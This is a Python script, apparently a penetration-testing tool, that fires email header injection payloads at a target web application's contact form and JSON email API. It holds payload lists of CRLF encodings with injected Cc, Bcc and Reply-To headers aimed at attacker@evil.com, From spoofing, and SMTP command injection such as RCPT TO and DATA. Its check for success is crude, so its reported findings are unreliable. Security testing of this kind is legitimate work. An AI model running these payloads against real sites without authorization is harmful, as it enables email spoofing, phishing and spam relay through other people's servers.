#!/usr/bin/env python3
"""Agent for testing email header injection vulnerabilities.

Tests web application email functionality for SMTP header injection
via CRLF sequences, allowing injection of CC/BCC headers, From
spoofing, MIME manipulation, and spam relay abuse.
"""

import json
import sys
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


CRLF_ENCODINGS = [
    ("%0A", "LF (URL-encoded)"),
    ("%0D%0A", "CRLF (URL-encoded)"),
    ("%0D", "CR (URL-encoded)"),
    ("\n", "Raw LF"),
    ("\r\n", "Raw CRLF"),
    ("%250A", "Double-encoded LF"),
    ("%25250A", "Triple-encoded LF"),
]

HEADER_PAYLOADS = [
    ("Cc:attacker@evil.com", "CC injection"),
    ("Bcc:attacker@evil.com", "BCC injection"),
    ("From:ceo@target.com", "From spoofing"),
    ("Reply-To:attacker@evil.com", "Reply-To hijack"),
    ("Subject:Injected Subject", "Subject override"),
    ("Content-Type:text/html", "Content-Type injection"),
    ("To:victim@target.com", "Additional recipient"),
]


class EmailHeaderInjectionAgent:
    """Tests web apps for email header injection vulnerabilities."""

    def __init__(self, target_url, output_dir="./email_injection"):
        self.target_url = target_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _post(self, path, data, content_type="form", timeout=15):
        if not requests:
            return None
        url = f"{self.target_url}{path}" if path.startswith("/") else self.target_url
        try:
            if content_type == "json":
                return requests.post(url, json=data, timeout=timeout)
            return requests.post(url, data=data, timeout=timeout)
        except requests.RequestException:
            return None

    def test_field_injection(self, endpoint, field_name, base_email,
                              base_payload=None):
        """Test a specific form field for header injection."""
        results = []
        base = base_payload or {}

        for crlf, crlf_desc in CRLF_ENCODINGS:
            for header, header_desc in HEADER_PAYLOADS:
                payload = {**base}
                payload[field_name] = f"{base_email}{crlf}{header}"

                resp = self._post(endpoint, payload)
                if not resp:
                    continue

                injected = False
                indicators = [
                    resp.status_code in (200, 302),
                    "sent" in resp.text.lower() or "success" in resp.text.lower(),
                    "error" not in resp.text.lower() and "invalid" not in resp.text.lower(),
                ]
                if sum(indicators) >= 2:
                    injected = True

                if injected:
                    result = {
                        "field": field_name,
                        "crlf_encoding": crlf_desc,
                        "header_injected": header_desc,
                        "payload": f"{base_email}{crlf}{header}",
                        "status_code": resp.status_code,
                    }
                    results.append(result)
                    self.findings.append({
                        "severity": "high",
                        "type": "Email Header Injection",
                        "detail": f"{field_name}: {header_desc} via {crlf_desc}",
                        "endpoint": endpoint,
                    })
                    break
        return results

    def test_contact_form(self, endpoint="/contact", base_email="test@test.com"):
        """Test a contact form for header injection across all fields."""
        fields_to_test = ["email", "name", "subject", "from", "reply_to"]
        base_payload = {
            "email": base_email,
            "name": "Test User",
            "subject": "Security Test",
            "message": "This is an authorized security test.",
        }
        all_results = []
        for field in fields_to_test:
            if field in base_payload or field in ("from", "reply_to"):
                results = self.test_field_injection(endpoint, field, base_email, base_payload)
                all_results.extend(results)
        return all_results

    def test_json_api(self, endpoint, base_email="test@test.com"):
        """Test JSON-based email API for injection."""
        results = []
        payloads = [
            {"to": f"{base_email}\nCc:attacker@evil.com", "subject": "Test", "body": "Test"},
            {"to": [base_email, "attacker@evil.com"], "subject": "Test", "body": "Test"},
            {"to": base_email, "subject": "Test\nBcc:attacker@evil.com", "body": "Test"},
        ]
        for i, payload in enumerate(payloads):
            resp = self._post(endpoint, payload, content_type="json")
            if resp and resp.status_code in (200, 201):
                results.append({
                    "payload_index": i,
                    "status": resp.status_code,
                    "response_preview": resp.text[:100],
                })
                self.findings.append({
                    "severity": "high",
                    "type": "JSON Email API Injection",
                    "detail": f"Payload {i} accepted at {endpoint}",
                })
        return results

    def test_smtp_commands(self, endpoint, field_name="email", base_email="test@test.com"):
        """Test for SMTP command injection."""
        smtp_payloads = [
            f"{base_email}\nRCPT TO:<attacker@evil.com>",
            f"{base_email}\nVRFY admin",
            f"{base_email}\nDATA\nSubject: Injected\n\nBody",
        ]
        results = []
        for payload in smtp_payloads:
            data = {field_name: payload, "message": "Test"}
            resp = self._post(endpoint, data)
            if resp and resp.status_code in (200, 302):
                results.append({"payload": payload[:60], "status": resp.status_code})
        return results

    def generate_report(self, endpoint="/contact"):
        form_results = self.test_contact_form(endpoint)

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "target": self.target_url,
            "endpoint": endpoint,
            "form_injection_results": form_results,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "email_injection_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <target_url> [--endpoint /contact]")
        sys.exit(1)
    url = sys.argv[1]
    endpoint = "/contact"
    if "--endpoint" in sys.argv:
        endpoint = sys.argv[sys.argv.index("--endpoint") + 1]
    agent = EmailHeaderInjectionAgent(url)
    agent.generate_report(endpoint)


if __name__ == "__main__":
    main()
